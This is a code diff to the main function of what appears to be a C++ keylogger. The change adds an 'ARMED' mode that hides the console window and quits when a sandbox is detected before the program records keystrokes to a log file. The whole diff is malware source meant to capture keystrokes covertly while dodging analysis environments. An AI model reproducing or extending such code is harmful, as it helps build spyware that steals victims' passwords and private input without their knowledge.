@@ -1,15 +1,19 @@
 #include "pch.h"
 
-#include "log/log.h"
 #include "log/logFILE/file.h"
 #include "sandboxdetect/sandboxdetect.h"
 #include "keyscan/keyscan.h"
 
 int main() {
-	if (!sandboxdetect::checkSafety())
-		return 0;
+	//if running in field hide console and check for sandbox environment
+	if (ARMED) {
+		FreeConsole();
+		if (!sandboxdetect::checkSafety()) return 0;
+	}
+	//scanning from hereon
 	auto* l = new logFILE("keylog.txt");
 	keyscan scanner(l);
 	scanner.scan();
+	//will never be reached
 	return 1;
 }
